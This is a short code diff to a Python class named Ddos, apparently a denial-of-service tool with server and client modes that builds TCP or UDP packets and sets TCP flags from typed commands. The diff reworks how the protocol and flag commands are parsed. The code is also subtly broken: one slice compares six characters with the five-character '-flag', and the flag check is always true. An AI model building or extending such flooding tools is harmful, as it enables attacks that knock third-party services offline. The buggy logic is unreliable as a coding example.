@@ -21,6 +21,10 @@ class Ddos:
             "ECE": 0x40,
             "CWR": 0x80
         }
+        self.Protocol = {
+            "tcp": False,
+            "udp": False
+        }
         mode = input("\n   [*]choose mode(server or client): ")
         if mode == "server":
             self._ServerMode()
@@ -61,17 +65,17 @@ class Ddos:
                 print(self.PacketBlueprint.show())
             elif Input == "resume join":
                 self.Join = True
-            elif "-protocol" in Input:
+            elif Input[0: 9] == "-protocol":
                 for char in range(10, len(Input)):
                     Protocol += Input[char]
                 if Protocol == "udp":
-                    self.PacketBlueprint = self.PacketBlueprint/UDP()
+                    self.Protocol["udp"] = True
                 elif Protocol == "tcp":
-                    self.PacketBlueprint = self.PacketBlueprint/TCP()
+                    self.Protocol["tcp"] = True
                 else:
                     print(f"\n   [!]Not a valid protocol parameter:{Protocol}")
                 Protocol = ""
-            elif "-flag" in Input and self.PacketBlueprint.haslayer(TCP):
+            elif Input[0:6] == "-flag" and self.Protocol.get("tcp"):
                 flag: int = 0
                 for char in range(6, len(Input)):
                     if (Flag == "SYN" or "URG" or "UDP" or "CWR" or "RST" or "FIN" or "ECE" or "PSH" or "ACK"):
